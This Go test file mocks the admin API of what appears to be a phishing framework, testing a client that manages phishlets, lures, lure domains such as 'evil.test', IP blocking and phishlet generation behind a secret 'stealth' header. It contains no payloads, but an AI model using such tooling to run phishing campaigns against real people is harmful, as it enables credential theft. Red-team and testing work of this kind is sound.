package menu

import (
	"net/http"
	"net/http/httptest"
	"testing"
)

func fakeAPI() *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Stealth-Host") != "s3cr3t" {
			w.WriteHeader(404)
			return
		}
		if r.Method == http.MethodDelete {
			w.WriteHeader(204)
			return
		}
		switch r.URL.Path {
		case "/api/v1/stats":
			_, _ = w.Write([]byte(`{"node":"n1","phishlets":2}`))
		case "/api/v1/phishlets":
			_, _ = w.Write([]byte(`["a","b"]`))
		case "/api/v1/phishlets/detail":
			_, _ = w.Write([]byte(`[{"id":"a","enabled":true,"domains":["x.test"]}]`))
		case "/api/v1/domains":
			if r.Method == http.MethodGet {
				_, _ = w.Write([]byte(`["evil.test"]`))
				return
			}
			w.WriteHeader(201)
		case "/api/v1/block":
			w.WriteHeader(204)
		case "/api/v1/lures":
			w.WriteHeader(201)
		case "/api/v1/phishlets/reload":
			w.WriteHeader(204)
		case "/api/v1/phishlets/generate":
			_, _ = w.Write([]byte("id: g1\n"))
		default:
			if r.Method == http.MethodPut {
				w.WriteHeader(204)
				return
			}
			w.WriteHeader(404)
		// DELETE /api/v1/domains/{d} — выше нет exact-case, ловим тут
		}
	}))
}

func TestClient(t *testing.T) {
	srv := fakeAPI()
	defer srv.Close()
	c := &Client{Base: srv.URL, Stealth: "s3cr3t"}
	st, err := c.Stats()
	if err != nil || st["node"] != "n1" {
		t.Fatalf("stats: %v %v", st, err)
	}
	ph, err := c.Phishlets()
	if err != nil || len(ph) != 2 {
		t.Fatalf("phishlets: %v %v", ph, err)
	}
	if err := c.Block("1.1.1.1", "t"); err != nil {
		t.Fatal(err)
	}
	if err := c.SmartLure("/l/1", "a", 10, 1, "", false); err != nil {
		t.Fatal(err)
	}
	if err := c.Reload(); err != nil {
		t.Fatal(err)
	}
	yml, err := c.Generate("o.com", "p.test", "g1")
	if err != nil || yml != "id: g1\n" {
		t.Fatalf("generate: %q %v", yml, err)
	}
	bad := &Client{Base: srv.URL, Stealth: "wrong"}
	if _, err := bad.Stats(); err == nil {
		t.Fatal("bad stealth must fail decode (404 body)")
	}
}

func TestSetPhishlet(t *testing.T) {
	srv := fakeAPI()
	defer srv.Close()
	c := &Client{Base: srv.URL, Stealth: "s3cr3t"}
	on := true
	if err := c.SetPhishlet("a", []string{"evil.test"}, &on); err != nil {
		t.Fatal(err)
	}
	if err := c.SetPhishlet("a", nil, nil); err != nil {
		t.Fatal(err)
	}
	bad := &Client{Base: srv.URL, Stealth: "wrong"}
	if err := bad.SetPhishlet("a", []string{"x"}, nil); err == nil {
		t.Fatal("bad stealth must fail")
	}
}

func TestPickers(t *testing.T) {
	srv := fakeAPI()
	defer srv.Close()
	c := &Client{Base: srv.URL, Stealth: "s3cr3t"}
	det, err := c.PhishletsDetail()
	if err != nil || len(det) != 1 || det[0].ID != "a" || !det[0].Enabled {
		t.Fatalf("detail: %+v %v", det, err)
	}
	doms, err := c.ListDomains()
	if err != nil || len(doms) != 1 || doms[0] != "evil.test" {
		t.Fatalf("domains: %v %v", doms, err)
	}
	if err := c.AddDomain("n.test"); err != nil {
		t.Fatal(err)
	}
	if err := c.RemoveDomain("evil.test"); err != nil {
		t.Fatal(err)
	}
}
